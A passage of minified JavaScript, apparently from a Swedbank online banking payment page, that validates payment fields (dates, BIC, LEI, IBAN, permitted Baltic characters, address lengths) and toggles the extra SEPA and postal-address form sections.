pattern="LT"===Swedbank.country?DATE_PATTERN_LT:DATE_PATTERN;if(!value.match(pattern))return!1}return!0},CharactersType={ID:"ID",LOCAL:"LOCAL"};this.CharactersType=CharactersType;const DATE_PATTERN="^(((0[1-9]|[12]\\d|3[01])\\.(0[13578]|1[02])\\.((1[6-9]|[2-9]\\d)\\d{2}))|((0[1-9]|[12]\\d|30)\\.(0[13456789]|1[012])\\.((1[6-9]|[2-9]\\d)\\d{2}))|((0[1-9]|1\\d|2[0-8]).02.((1[6-9]|[2-9]\\d)\\d{2}))|(29\\.02\\.((1[6-9]|[2-9]\\d)(0[48]|[2468][048]|[13579][26])|((16|[2468][048]|[3579][26])00))))$",DATE_PATTERN_LT="^[0-9]{4}-(((0[13578]|(10|12))-(0[1-9]|[1-2][0-9]|3[0-1]))|(02-(0[1-9]|[1-2][0-9]))|((0[469]|11)-(0[1-9]|[1-2][0-9]|30)))$",latinCharacters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/-?:().,'+ \r\n",countrySpecificCharacters={EE:"õäöüšžÕÄÖÜŠŽ",LV:"āčēģīķļņšūžĀČĒĢĪĶĻŅŠŪŽ",LT:"ąčėęįšūųžĄČĖĘĮŠŪŲŽ"},CharacterValidationResult=function(invalidCharacters,_allowedCharacters,charactersType){const _invalidCharacters=invalidCharacters,_charactersType=charactersType;return this.containsInvalidCharacters=function(){return _invalidCharacters.length>0},this.getInvalidCharacters=function(){return _invalidCharacters},this.getCharactersType=function(){return _charactersType},this},validateCharacters=function(string,typeOfAllowedCharacters){const validCharacters=function(typeOfAllowedCharacters){return typeOfAllowedCharacters===CharactersType.LOCAL?latinCharacters+countrySpecificCharacters[Swedbank.country]+'_&%#|";=!€–':latinCharacters}(typeOfAllowedCharacters);if(!string)return new CharacterValidationResult([],validCharacters,typeOfAllowedCharacters);const invalidCharacters=[];for(let i=0;i<string.length;i++){const character=string[i];-1===validCharacters.indexOf(character)&&-1===invalidCharacters.indexOf(character)&&invalidCharacters.push(character)}return new CharacterValidationResult(invalidCharacters,validCharacters,typeOfAllowedCharacters)},startsOrEndsWithSlash=function(string){return!!string&&("/"===string[0]||"/"===string[string.length-1])},containsSlashPair=function(string){return!!string&&-1!==string.indexOf("//")};this.validateIdField=function(field,fieldName,required,shouldValidateCharacters,onErrorCallback){const value=$.trim($(field).val());if(required&&0===value.length)return onErrorCallback(field,"empty",{fieldName:fieldName});if(value.length>35)return onErrorCallback(field,"tooLong",{fieldName:fieldName});if(shouldValidateCharacters){const characterValidationResult=validateCharacters(value,CharactersType.ID);if(characterValidationResult.containsInvalidCharacters())return onErrorCallback(field,"containsInvalidCharacters",{characterValidationResult:characterValidationResult,fieldName:fieldName});if(startsOrEndsWithSlash(value))return onErrorCallback(field,"startsOrEndsWithSlash",{fieldName:fieldName});if(containsSlashPair(value))return onErrorCallback(field,"containsSlashPair",{fieldName:fieldName})}},this.validateName=function(field,required,shouldValidateCharacters,onErrorCallback){const name=$.trim($(field).val());if(required&&0===name.length)onErrorCallback(field,"empty");else if(name.length>140&&onErrorCallback(field,"tooLong"),shouldValidateCharacters){const characterValidationResult=validateCharacters(name,CharactersType.LOCAL);characterValidationResult.containsInvalidCharacters()&&onErrorCallback(field,"containsInvalidCharacters",{characterValidationResult:characterValidationResult})}},this.validateRemittanceInfo=function(unstructuredRemittanceInfo,creditorReference,options){const unstructuredRemittanceInfoRequired=options.unstructuredRemittanceInfoRequired,creditorReferenceRequired=options.creditorReferenceRequired,shouldValidateCharacters=options.shouldValidateCharacters,typeOfAllowedCharacters=options.typeOfAllowedCharacters?options.typeOfAllowedCharacters:CharactersType.LOCAL,onErrorCallback=options.onErrorCallback;this.validateUnstructuredRemittanceInfo(unstructuredRemittanceInfo,shouldValidateCharacters,unstructuredRemittanceInfoRequired,onErrorCallback,typeOfAllowedCharacters),this.validateCreditorReference(creditorReference,shouldValidateCharacters,creditorReferenceRequired,onErrorCallback,typeOfAllowedCharacters)},this.validateUnstructuredRemittanceInfo=function(unstructuredRemittanceInfo,shouldValidateCharacters,required,onErrorCallback,typeOfAllowedCharacters){const value=$.trim($(unstructuredRemittanceInfo).val());if(required&&0===value.length)onErrorCallback(unstructuredRemittanceInfo,"emptyUnstructuredRemittanceInfo");else if(value.length>140&&onErrorCallback(unstructuredRemittanceInfo,"unstructuredRemittanceInfoTooLong"),shouldValidateCharacters){const characterValidationResult=validateCharacters(value,typeOfAllowedCharacters);characterValidationResult.containsInvalidCharacters()&&onErrorCallback(unstructuredRemittanceInfo,"unstructuredRemittanceInfoContainsInvalidCharacters",{characterValidationResult:characterValidationResult})}},this.validateCreditorReference=function(creditorReference,shouldValidateCharacters,required,onErrorCallback,typeOfAllowedCharacters){const value=$.trim($(creditorReference).val());if(required&&0===value.length)onErrorCallback(creditorReference,"emptyCreditorReferenceNumber");else{if(value.length>35)return void onErrorCallback(creditorReference,"creditorReferenceNumberTooLong");if(shouldValidateCharacters){const characterValidationResult=validateCharacters(value,typeOfAllowedCharacters);characterValidationResult.containsInvalidCharacters()&&onErrorCallback(creditorReference,"creditorReferenceNumberContainsInvalidCharacters",{characterValidationResult:characterValidationResult})}}},this.validateIdentificationNumber=function(field,required,shouldValidateCharacters,onErrorCallback){const value=$.trim($(field).val());if(required&&0===value.length)onErrorCallback(field,"empty");else if(shouldValidateCharacters){const characterValidationResult=validateCharacters(value,CharactersType.ID);if(characterValidationResult.containsInvalidCharacters())return void onErrorCallback(field,"containsInvalidCharacters",{characterValidationResult:characterValidationResult});if(startsOrEndsWithSlash(value))return void onErrorCallback(field,"startsOrEndsWithSlash");containsSlashPair(value)&&onErrorCallback(field,"containsSlashPair")}},this.validateDate=function(field,required,onErrorCallback){const value=$.trim(field.val());required&&isEmpty(value)?onErrorCallback(field,"empty"):isFollowingDatePatternStandards(value)||onErrorCallback(field,"doesNotFollowStandard")},this.validateBirthDate=function(field,fieldName,required,onErrorCallback){const value=$.trim(field.val());if(required&&isEmpty(value))return onErrorCallback(field,"empty",{fieldName:fieldName});if(!isFollowingDatePatternStandards(value))return onErrorCallback(field,"doesNotFollowStandard",{fieldName:fieldName});const inputDate=$.datepicker.parseDate("LT"===Swedbank.country?"yy-mm-dd":"dd.mm.yy",$.trim(field.val())),currentDate=new Date;return inputDate.getTime()>currentDate.getTime()?onErrorCallback(field,"invalid",{fieldName:fieldName}):void 0},this.validateBirthCountry=function(dropdown,fieldName,required,onErrorCallback,checkCountry){const value=$.trim(dropdown.find("option:selected").val());return required&&0===value.length?onErrorCallback(dropdown,"empty",{fieldName:fieldName}):checkCountry(value)?void 0:onErrorCallback(dropdown,"invalid",{fieldName:fieldName})},this.validateBICorBEI=function(field,required,onErrorCallback){const value=$.trim(field.val());required&&0===value.length?onErrorCallback(field,"empty"):value.match("^[A-Z]{6,6}[A-Z2-9][A-NP-Z0-9]([A-Z0-9]{3,3}){0,1}$")||onErrorCallback(field,"doesNotFollowStandard",{fieldName:"bicOrBei"})},this.validateAnyBIC=function(field,required,onErrorCallback){const value=$.trim(field.val());if(required&&0===value.length)return onErrorCallback(field,"empty");value.match("^([A-Z0-9]{4,4}[A-Z]{2,2}[A-Z0-9]{2,2}([A-Z0-9]{3,3}){0,1})$")||onErrorCallback(field,"doesNotFollowStandard",{fieldName:"anyBic"})},this.validateLEI=function(field,required,onErrorCallback){const value=$.trim(field.val());if(required&&0===value.length)return onErrorCallback(field,"empty");value.match("^([A-Z0-9]{18,18}[0-9]{2,2})?$")||onErrorCallback(field,"doesNotFollowStandard",{fieldName:"lei"})},this.validateAccountNumber=function(field,required,onErrorCallback,validateIBAN){const value=$.trim(field.val());required&&0===value.length?onErrorCallback(field,"empty"):validateIBAN&&this.validateIBANAccount(field,onErrorCallback)},this.validateIBANAccount=function(field,onErrorCallback){const accountNumber=$.trim(field.val());AccountNumber.isValid(accountNumber)||onErrorCallback(field,"doesNotFollowStandard")},this.validateDomesticPartyAddress=function(field,required,shouldValidateCharacters,onErrorCallback){const value=$.trim(field.val());if(value.length>140)onErrorCallback(field,"tooLong");else if(shouldValidateCharacters){const characterValidationResult=validateCharacters(value,CharactersType.LOCAL);characterValidationResult.containsInvalidCharacters()&&onErrorCallback(field,"containsInvalidCharacters",{characterValidationResult:characterValidationResult})}},this.validateDomesticPartyPostAddress=function(postAddress,onErrorCallback){const typeOfAllowedCharacters=CharactersType.LOCAL;validateAddressField(postAddress.address,"addressRow",140,onErrorCallback,typeOfAllowedCharacters),function(field,fieldName,onErrorCallback){const value=$.trim(field.find("option:selected").val());0!==value.length&&(countryExists(value)||onErrorCallback(field,fieldName,"invalid"))}(postAddress.countryCode,"countryCode",onErrorCallback),validateAddressField(postAddress.countrySubDivision,"countrySubDivision",35,onErrorCallback,typeOfAllowedCharacters),validateAddressField(postAddress.districtName,"districtName",35,onErrorCallback,typeOfAllowedCharacters),validateAddressField(postAddress.townName,"townName",35,onErrorCallback,typeOfAllowedCharacters),validateAddressField(postAddress.townLocationName,"townLocationName",35,onErrorCallback,typeOfAllowedCharacters),validateAddressField(postAddress.streetName,"streetName",70,onErrorCallback,typeOfAllowedCharacters),validateAddressField(postAddress.buildingNumber,"buildingNumber",16,onErrorCallback,typeOfAllowedCharacters),validateAddressField(postAddress.room,"room",70,onErrorCallback,typeOfAllowedCharacters),validateAddressField(postAddress.floor,"floor",70,onErrorCallback,typeOfAllowedCharacters),validateAddressField(postAddress.buildingName,"buildingName",35,onErrorCallback,typeOfAllowedCharacters),validateAddressField(postAddress.department,"department",70,onErrorCallback,typeOfAllowedCharacters),validateAddressField(postAddress.subDepartment,"subDepartment",70,onErrorCallback,typeOfAllowedCharacters),validateAddressField(postAddress.postBox,"postBox",16,onErrorCallback,typeOfAllowedCharacters),validateAddressField(postAddress.postCode,"postCode",16,onErrorCallback,typeOfAllowedCharacters)}},UICurtainExtraFieldsToggler=function(options){const self=this;this.toggler=document.querySelector(options.containerId),this.toggler.addEventListener("curtain-toggle",(event=>{this.toggler!==event.target||event.target.open||self.clearExtraFields()}))};UICurtainExtraFieldsToggler.prototype={show:function(){this.toggler.show()},hide:function(){this.clearExtraFields(),this.toggler.hide()},showAndOpenIfNeeded:function(){this.show(),this.mustShow()&&(this.toggler.open=!0)}};const ExtraFieldsToggler=function(options){const self=this;this.isVisible=!1,this.shouldClearData=!!options.shouldClearData&&options.shouldClearData,this.toggler=$(options.containerId),this.toggler.on("curtain-closed",(event=>{self.shouldClearData&&(self.clearExtraFields(),$(event.target).find(":input[disabled-until-closed]").removeAttr("disabled"))})),this.link=this.toggler.find("> a"),this.link.on("click",(function(){self.isVisible=!self.isVisible}))};ExtraFieldsToggler.prototype={toggle:function(){this.isVisible?this.hide():this.show()},show:function(){this.isVisible||this.link.trigger("click")},showIfNeeded:function(){this.mustShow()&&this.show()},hide:function(){this.isVisible&&this.link.trigger("click")},completeDisable:function(){this.toggler.hide()},completeEnable:function(){this.toggler.show()},disable:function(){this.link.add(this.link.prev("div.separator")).hide()},enable:function(){this.link.add(this.link.prev("div.separator")).show()},toggleAfterFilling:function(){this.mustShow()?this.show():this.hide()}};const SepaExtraFieldsToggler=function(options){ExtraFieldsToggler.call(this,options),this.endToEndId=options.endToEndId,this.creditorId=options.creditorId,this.ultimateDebtorName=options.ultimateDebtorName,this.ultimateDebtorAddressType=options.ultimateDebtorAddressType,this.ultimateDebtorId=options.ultimateDebtorId,this.ultimateCreditorName=options.ultimateCreditorName,this.ultimateCreditorAddressType=options.ultimateCreditorAddressType,this.ultimateCreditorId=options.ultimateCreditorId,this.isPrivate=options.isPrivate,this.isDefined=options.isDefined,this.defaultDocumentNumber=options.defaultDocumentNumber,this.ultimateDebtorPostAddressToggler=options.ultimateDebtorPostAddressToggler,this.ultimateCreditorPostAddressToggler=options.ultimateCreditorPostAddressToggler};(SepaExtraFieldsToggler.prototype=Object.create(ExtraFieldsToggler.prototype)).getRows=function(){return $("dd.extra-row").add($("dd.extra-row").prev("dt"))},SepaExtraFieldsToggler.prototype.constructor=SepaExtraFieldsToggler;const DomesticSepaExtraFieldsToggler=function(options){SepaExtraFieldsToggler.call(this,options)};(DomesticSepaExtraFieldsToggler.prototype=Object.create(SepaExtraFieldsToggler.prototype)).constructor=DomesticSepaExtraFieldsToggler;const DomesticSepaExtraFieldsTogglerLT=function(options){DomesticSepaExtraFieldsToggler.call(this,options),this.valueDate=options.valueDate,this.documentNumber=options.documentNumber,this.defaultDocumentNumber=options.defaultDocumentNumber};(DomesticSepaExtraFieldsTogglerLT.prototype=Object.create(DomesticSepaExtraFieldsToggler.prototype)).mustShow=function(){const identificationNotEmpty=!this.creditorId.isEmpty()||!this.ultimateDebtorId.isEmpty()||!this.ultimateCreditorId.isEmpty(),nameNotEmpty=0!==$.trim(this.ultimateDebtorName.val()).length||0!==$.trim(this.ultimateCreditorName.val()).length,ultimateDebtorAddressStructured="structured"===this.ultimateDebtorAddressType,ultimateCreditorAddressStructured="structured"===this.ultimateCreditorAddressType,endToEndIdNotEmpty=0!==$.trim(this.endToEndId.val()).length;let dateOrDocumentNumberChanged=!1;if(this.isPrivate&&!this.isDefined){const dateSplit=this.valueDate.val().split("-"),currentValueDate=new Date(dateSplit[0],dateSplit[1]-1,dateSplit[2]),currentDocumentNumber=this.documentNumber.val();currentValueDate.getTime()===function(){const defaultDate=new Date;return defaultDate.setHours(0,0,0,0),defaultDate}().getTime()&&currentDocumentNumber===this.defaultDocumentNumber||(dateOrDocumentNumberChanged=!0)}return identificationNotEmpty||nameNotEmpty||ultimateDebtorAddressStructured||ultimateCreditorAddressStructured||dateOrDocumentNumberChanged||this.isPrivate&&endToEndIdNotEmpty},DomesticSepaExtraFieldsTogglerLT.prototype.clearExtraFields=function(){this.creditorId.clear(),this.ultimateCreditorId.clear(),this.ultimateDebtorId.clear(),this.isPrivate&&this.endToEndId.val(""),this.ultimateDebtorName.val(""),this.ultimateCreditorName.val("")},DomesticSepaExtraFieldsTogglerLT.prototype.constructor=DomesticSepaExtraFieldsTogglerLT;const DomesticSepaExtraFieldsTogglerLV=function(options){DomesticSepaExtraFieldsToggler.call(this,options)};(DomesticSepaExtraFieldsTogglerLV.prototype=Object.create(DomesticSepaExtraFieldsToggler.prototype)).mustShow=function(){const identificationNotEmpty=!this.ultimateDebtorId.isEmpty()||!this.ultimateCreditorId.isEmpty(),nameNotEmpty=0!==$.trim(this.ultimateDebtorName.val()).length||0!==$.trim(this.ultimateCreditorName.val()).length,ultimateDebtorAddressStructured="structured"===this.ultimateDebtorAddressType,ultimateCreditorAddressStructured="structured"===this.ultimateCreditorAddressType,endToEndIdNotEmpty=0!==$.trim(this.endToEndId.val()).length;return identificationNotEmpty||nameNotEmpty||ultimateDebtorAddressStructured||ultimateCreditorAddressStructured||endToEndIdNotEmpty},DomesticSepaExtraFieldsTogglerLV.prototype.clearExtraFields=function(){this.ultimateCreditorId.clear(),this.ultimateDebtorId.clear(),this.endToEndId.val(""),this.ultimateDebtorName.val(""),this.ultimateCreditorName.val("")},DomesticSepaExtraFieldsTogglerLV.prototype.constructor=DomesticSepaExtraFieldsTogglerLV;const DomesticSepaExtraFieldsTogglerEE=function(options){DomesticSepaExtraFieldsToggler.call(this,options)};(DomesticSepaExtraFieldsTogglerEE.prototype=Object.create(DomesticSepaExtraFieldsToggler.prototype)).mustShow=function(){const identificationNotEmpty=!this.creditorId.isEmpty()||!this.ultimateDebtorId.isEmpty()||!this.ultimateCreditorId.isEmpty(),nameNotEmpty=0!==$.trim(this.ultimateDebtorName.val()).length||0!==$.trim(this.ultimateCreditorName.val()).length,ultimateDebtorAddressStructured="structured"===this.ultimateDebtorAddressType,ultimateCreditorAddressStructured="structured"===this.ultimateCreditorAddressType,endToEndIdNotEmpty=0!==$.trim(this.endToEndId.val()).length;return identificationNotEmpty||nameNotEmpty||ultimateDebtorAddressStructured||ultimateCreditorAddressStructured||endToEndIdNotEmpty},DomesticSepaExtraFieldsTogglerEE.prototype.clearExtraFields=function(){this.creditorId.clear(),this.ultimateCreditorId.clear(),this.ultimateDebtorId.clear(),this.endToEndId.val(""),this.ultimateDebtorName.val(""),this.ultimateCreditorName.val("")},DomesticSepaExtraFieldsTogglerLV.prototype.constructor=DomesticSepaExtraFieldsTogglerLV;const ForeignSepaExtraFieldsToggler=function(options){SepaExtraFieldsToggler.call(this,options)};(ForeignSepaExtraFieldsToggler.prototype=Object.create(SepaExtraFieldsToggler.prototype)).clearExtraFields=function(){this.ultimateCreditorId.clear(),this.ultimateDebtorId.clear(),this.isPrivate&&this.endToEndId.val(""),this.ultimateDebtorName.val(""),this.ultimateCreditorName.val(""),this.ultimateDebtorPostAddressToggler.clearExtraFields(),this.ultimateDebtorPostAddressToggler.hide(),this.ultimateCreditorPostAddressToggler.clearExtraFields(),this.ultimateCreditorPostAddressToggler.hide()},ForeignSepaExtraFieldsToggler.prototype.mustShow=function(){const isUltimateAddressNotEmpty=this.ultimateDebtorPostAddressToggler.hasAnyValues()||this.ultimateCreditorPostAddressToggler.hasAnyValues(),identificationNotEmpty=!this.ultimateDebtorId.isEmpty()||!this.ultimateCreditorId.isEmpty(),nameNotEmpty=0!==$.trim(this.ultimateDebtorName.val()).length||0!==$.trim(this.ultimateCreditorName.val()).length;let dateOrDocumentNumberChanged=!1;const endToEndIdNotEmpty=0!==$.trim(this.endToEndId.val()).length;if(this.isPrivate&&!this.isDefined){const dateSplit=$("#valueDate").val().split("LT"===Swedbank.country?"-":".");let currentValueDate;currentValueDate="LT"===Swedbank.country?new Date(dateSplit[0],dateSplit[1]-1,dateSplit[2]):new Date(dateSplit[2],dateSplit[1]-1,dateSplit[0]);const currentDocumentNumber=$("input[name$=payment\\.documentNumber]").val();currentValueDate.getTime()===function(){const defaultDate=new Date;return defaultDate.setHours(0,0,0,0),defaultDate}().getTime()&&currentDocumentNumber===this.defaultDocumentNumber||(dateOrDocumentNumberChanged=!0)}return identificationNotEmpty||nameNotEmpty||dateOrDocumentNumberChanged||this.isPrivate&&endToEndIdNotEmpty||isUltimateAddressNotEmpty},ForeignSepaExtraFieldsToggler.prototype.constructor=ForeignSepaExtraFieldsToggler;const CreditorAddressFieldsToggler=function(options){ExtraFieldsToggler.call(this,options),this.creditorAddress=options.creditorAddress,this.creditorCountry=options.creditorCountry,this.creditorAddressType=options.creditorAddressType,this.hide()};return(CreditorAddressFieldsToggler.prototype=Object.create(ExtraFieldsToggler.prototype)).getRows=function(){return $("#creditorAddressRow").add($("#creditorAddressRow").prev("dt")).add("#creditorCountryRow").add($("#creditorCountryRow").prev("dt"))},CreditorAddressFieldsToggler.prototype.mustShow=function(){return void 0!==this.creditorAddress.val()&&""!==this.creditorAddress.val()||void 0!==this.creditorCountry.val()&&""!==this.creditorCountry.val()||this.areStructuredFieldsSet()},CreditorAddressFieldsToggler.prototype.setAddressType=function(addressType){this.creditorAddressType=addressType},CreditorAddressFieldsToggler.prototype.areStructuredFieldsSet=function(){return void 0!==this.creditorAddressType&&"unspecified"!==this.creditorAddressType},CreditorAddressFieldsToggler.prototype.constructor=CreditorAddressFieldsToggler,{PartyTypes:PartyTypes,PartyId:PartyId,DebtorId:function(selector,options){const p=new PartyId(selector,options),partyType=options.partyType;let requiredIdSpecialAttribute=null;const debtorRegistrationCode=options.debtorRegistrationCode,noneInExtended=void 0===options.noneInExtended||options.noneInExtended;return p.getMainIdDropdownIdTypes=function(partyType,requiredIdSpecialAttribute){let dropdownIdTypes=[];return null!==requiredIdSpecialAttribute||noneInExtended||dropdownIdTypes.push("NONE"),"LT"!==Swedbank.country?(dropdownIdTypes=dropdownIdTypes.concat(options.mainIdTypes[partyType]),dropdownIdTypes.push("EXTENDED"),dropdownIdTypes):(partyType===PartyTypes.ORGANISATION&&"PC"!==requiredIdSpecialAttribute?dropdownIdTypes.push("COMPANY_ID"):partyType===PartyTypes.PRIVATE&&"PC"!==requiredIdSpecialAttribute&&dropdownIdTypes.push("NATIONAL_ID_NUMBER"),"AK"!==requiredIdSpecialAttribute&&dropdownIdTypes.push("CUSTOMER_ID_NUMBER_V4"),requiredIdSpecialAttribute||dropdownIdTypes.push("EXTENDED"),dropdownIdTypes)},p.getExtendedIdDropdownIdTypes=function(partyType){const idTypes=p.extendedIdTypes[partyType].slice(0);return noneInExtended&&idTypes.push("NONE"),idTypes},p.createMainIdTypeDropdown=function(){const dropdown=$("<select></select>"),dropdownIdTypes=p.getMainIdDropdownIdTypes(partyType,requiredIdSpecialAttribute);return $.each(dropdownIdTypes,(function(i,val){dropdown.append(createOption(val,"NONE"===val?"doNotSpecify":val))})),dropdown.change($.proxy(this.onMainIdTypeChange,p)),dropdown},p.setRequiredIdType=function(specialAttribute){requiredIdSpecialAttribute!==specialAttribute&&(requiredIdSpecialAttribute=specialAttribute,p.update())},p.getDefaultValues=function(idType){return"NATIONAL_ID_NUMBER"===idType||"COMPANY_ID"===idType?{identificationNumber:debtorRegistrationCode}:{}},p.isReadonly=function(idType){return"NATIONAL_ID_NUMBER"===idType||"COMPANY_ID"===idType},p.getCurrentPartyType=function(){return"NONE"!==p.getMainIdDropdownValue()?partyType:PartyTypes.NONE},p.setValue=function(idType,values){let c;const mainAvailableIdTypes=p.getMainIdDropdownIdTypes(partyType,requiredIdSpecialAttribute),extendedAvailableIdTypes=p.getExtendedIdDropdownIdTypes(partyType),isIdTypeAvailable=-1!==$.inArray(idType,mainAvailableIdTypes)||-1!==$.inArray(idType,extendedAvailableIdTypes);idType&&isIdTypeAvailable||(idType=mainAvailableIdTypes[0],values={});-1!==$.inArray(idType,mainAvailableIdTypes)?(p.setMainIdTypesDropdownValue(idType),"NATIONAL_ID_NUMBER"===idType||"COMPANY_ID"===idType?(c=p.getMainIdTypesRow().find(".input-fields"),inputs[idType].setter.call(c,{identificationNumber:debtorRegistrationCode}),c.find("input").prop("readonly",!0)):(c=p.getMainIdTypesRow().find(".input-fields"),inputs[idType].setter.call(c,values))):(p.setMainIdTypesDropdownValue("EXTENDED"),p.setExtendedIdTypesDropdownValue(idType),c=p.getExtendedIdTypesRow().find(".input-fields"),inputs[idType].setter.call(c,values)),$(".ui-datepicker-trigger").remove()},p.isEmpty=function(){const notSelected="EXTENDED"===p.getMainIdDropdownValue()&&!p.getExtendedIdDropdownValue();return function(){const idTypes=p.getMainIdDropdownIdTypes(partyType,requiredIdSpecialAttribute);return p.getCurrentIdType()===idTypes[0]}()||("NONE"===p.getCurrentIdType()||""===p.getCurrentIdType())&&!notSelected},p},IsoPostalAddress:function(containerSelector,togglerType){const bankType_CREDITOR_BANK="CREDITOR_BANK",bankType_CORRESPONDENT_BANK="CORRESPONDENT_BANK",bankType_INTERMEDIARY_BANK="INTERMEDIARY_BANK",addressType={STRUCTURED:"STRUCTURED",UNSTRUCTURED:"UNSTRUCTURED"};let radio,container,hasUnstructuredOption,isDestinationWorldwide,isUrgent,type,prevType,country,address,addressLine1,addressLine2,province,districtName,town,townLocationName,street,houseNumber,apartmentNumber,floor,houseName,department,subDepartment,postBox,postCode;function detailedAddressIsMandatory(){return(isDestinationWorldwide||isUrgent)&&"CREDITOR"===togglerType&&["CA","CN","HK","IN","UA"].includes(country.val())}this.getContainer=function(){return containerSelector},this.create=function(){const isoPostalAddress=this;return radio=$("input[name$="+containerSelector+"]"),container=$("#"+containerSelector),hasUnstructuredOption=3===radio.length,isDestinationWorldwide=!1,isUrgent=!1,prevType="",type=$("#"+containerSelector+"\\.type"),country=$("#"+containerSelector+"\\.countryCode"),address=$("#"+containerSelector+"\\.address"),addressLine1=$("#"+containerSelector+"\\.addressLine1"),addressLine2=$("#"+containerSelector+"\\.addressLine2"),province=$("#"+containerSelector+"\\.countrySubDivision"),districtName=$("#"+containerSelector+"\\.districtName"),town=$("#"+containerSelector+"\\.townName"),townLocationName=$("#"+containerSelector+"\\.townLocationName"),street=$("#"+containerSelector+"\\.streetName"),houseNumber=$("#"+containerSelector+"\\.buildingNumber"),apartmentNumber=$("#"+containerSelector+"\\.room"),floor=$("#"+containerSelector+"\\.floor"),houseName=$("#"+containerSelector+"\\.buildingName"),department=$("#"+containerSelector+"\\.department"),subDepartment=$("#"+containerSelector+"\\.subDepartment"),postBox=$("#"+containerSelector+"\\.postBox"),postCode=$("#"+containerSelector+"\\.postCode"),country.on("change",(function(event){detailedAddressIsMandatory()&&isoPostalAddress.setDetailedAddressCurtainsOpen(!0)})),radio.click({param1:isoPostalAddress},(function(){!function handleRadioButtonEvent(isoPostalAddress,event){"structured"===$(event).val()?function showStructured(isoPostalAddress,event){type.val(addressType.STRUCTURED),$(event).prop("checked",!0),$("#"+containerSelector+"\\.unstructuredFields").hide(),$("#"+containerSelector+"\\.structuredFields").show(),$("#"+containerSelector+"\\.countryDropdown").show(),isoPostalAddress.markMandatoryFields(),isoPostalAddress.clearExtraFields(!0),isoPostalAddress.setDetailedAddressCurtainsOpen(detailedAddressIsMandatory()),container.show()}(isoPostalAddress,event):"unstructured"===$(event).val()?function showUnstructured(isoPostalAddress,event){type.val(addressType.UNSTRUCTURED),$(event).prop("checked",!0),$("#"+containerSelector+"\\.unstructuredFields").show(),$("#"+containerSelector+"\\.structuredFields").hide(),isoPostalAddress.isBankPostAddress()?($("#"+containerSelector+"\\.countryDropdown").hide(),isoPostalAddress.clearExtraFields()):isoPostalAddress.clearExtraFields(!0);isoPostalAddress.setDetailedAddressCurtainsOpen(!1),isoPostalAddress.markMandatoryFields(),container.show()}(isoPostalAddress,event):(type.val(""),container.hide(),isoPostalAddress.clearExtraFields(),isoPostalAddress.setDetailedAddressCurtainsOpen(!1))}(isoPostalAddress,this)})),hasUnstructuredOption&&(address.on("change keyup",{param1:isoPostalAddress},(function(){!function handleAddressFieldFilling(isoPostalAddress,event){const input=$(event).val();input.length>70?(isoPostalAddress.getAddressLine1().val(input.substring(0,70)),isoPostalAddress.getAddressLine2().val(input.substring(70))):(isoPostalAddress.getAddressLine1().val(input),isoPostalAddress.getAddressLine2().val(""))}(isoPostalAddress,this)})),this.initAddressField(addressLine1.val(),addressLine2.val())),this.hide(),isoPostalAddress},this.unhideDoNotSpecifyOption=function(){const radioButtonsContainer=$("#"+containerSelector+"SelectionRow");radioButtonsContainer.children()[0].show(),radioButtonsContainer.children()[1].show(),this.hasAnyValues()||$(radio[0]).trigger("click")},this.hideDoNotSpecifyOption=function(){const radioButtonsContainer=$("#"+containerSelector+"SelectionRow");radioButtonsContainer.children()[0].hide(),radioButtonsContainer.children()[1].hide(),this.hasAnyValues()||$(radio[1]).trigger("click")},this.fillFields=function(payment){const data=this.getValues(payment,containerSelector.replace("\\",""));prevType=data.prevType,country.val(data.country),province.val(data.province),districtName.val(data.districtName),town.val(data.town),townLocationName.val(data.townLocationName),street.val(data.street),houseNumber.val(data.houseNumber),apartmentNumber.val(data.apartmentNumber),floor.val(data.floor),houseName.val(data.houseName),department.val(data.department),subDepartment.val(data.subDepartment),postBox.val(data.postBox),postCode.val(data.postCode),hasUnstructuredOption&&(address.val(""),addressLine1.val(data.addressLine1),addressLine2.val(data.addressLine2),this.hasAnyValues()||"CREDITOR"!==togglerType||isEmpty(payment.beneficiaryAddress)||addressLine1.val(payment.beneficiaryAddress),this.initAddressField(addressLine1.val(),addressLine2.val()))},this.getValues=function(data,party){return{prevType:data[party+".type"],country:data[party+".countryCode"],addressLine1:data[party+".addressLine1"],addressLine2:data[party+".addressLine2"],province:data[party+".province"],districtName:data[party+".districtName"],town:data[party+".townName"],townLocationName:data[party+".townLocationName"],street:data[party+".streetName"],houseNumber:data[party+".buildingNumber"],apartmentNumber:data[party+".apartmentNumber"],floor:data[party+".floor"],houseName:data[party+".buildingName"],department:data[party+".department"],subDepartment:data[party+".subDepartment"],postBox:data[party+".postBox"],postCode:data[party+".postCode"]}},this.clearExtraFields=function(retainCountry){retainCountry||country.val(""),address.val(""),addressLine1.val(""),addressLine2.val(""),province.val(""),districtName.val(""),town.val(""),townLocationName.val(""),street.val(""),houseNumber.val(""),apartmentNumber.val(""),floor.val(""),houseName.val(""),department.val(""),subDepartment.val(""),postBox.val(""),postCode.val("")},this.toggleAfterFilling=function(){this.hasAnyValues()&&this.show()},this.show=function(){this.hasStructuredValues()?(this.selectStructured(),this.setDetailedAddressCurtainsOpen(this.hasStructuredOptionalValues()||detailedAddressIsMandatory())):hasUnstructuredOption&&this.hasUnStructuredValues()?this.selectUnstructured():isEmpty(country.val())||(hasUnstructuredOption&&addressType.UNSTRUCTURED===prevType?this.selectUnstructured():(this.selectStructured(),this.setDetailedAddressCurtainsOpen(this.hasStructuredOptionalValues()||detailedAddressIsMandatory()))),container.show()},this.selectStructured=function(){type.val(addressType.STRUCTURED),$(radio[1]).prop("checked",!0),$("#"+containerSelector+"\\.unstructuredFields").hide(),$("#"+containerSelector+"\\.structuredFields").show(),$("#"+containerSelector+"\\.countryDropdown").show(),this.markMandatoryFields()},this.selectUnstructured=function(){type.val(addressType.UNSTRUCTURED),$(radio[2]).prop("checked",!0),$("#"+containerSelector+"\\.unstructuredFields").show(),$("#"+containerSelector+"\\.structuredFields").hide(),this.isBankPostAddress()&&$("#"+containerSelector+"\\.countryDropdown").hide(),this.markMandatoryFields()},this.initAddressField=function(line1,line2){isEmpty(line1)||isEmpty(line2)?isEmpty(line1)||address.val(line1):address.val(line1+line2)},this.markMandatoryFields=function(){addressType.STRUCTURED===type.val()&&this.markStructuredMandatoryFields(),addressType.UNSTRUCTURED===type.val()&&this.markUnstructuredMandatoryFields()},this.markStructuredMandatoryFields=function(){this.setCountryCodeRequired(!0)},this.markUnstructuredMandatoryFields=function(){this.setCountryCodeRequired(!1)},this.setCountryCodeRequired=function(isRequired){const 